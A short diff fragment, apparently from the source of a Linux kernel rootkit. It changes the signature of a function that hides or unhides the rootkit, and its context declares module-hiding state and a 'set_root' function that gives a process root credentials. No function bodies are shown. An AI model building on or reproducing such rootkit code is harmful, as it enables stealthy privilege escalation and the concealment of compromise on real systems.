@@ -10,7 +10,7 @@ extern int BUFFER_SIZE;
 bool module_hidden = false;
 static struct list_head *prev_module; //location of the previous module
 
-static int hide_rootkit(void); //function to unhide\hide the rootkit
+static int hide_rootkit(bool); //function to unhide\hide the rootkit
 static int set_root(void); //changes credentials of process to root
 
 //hook functions
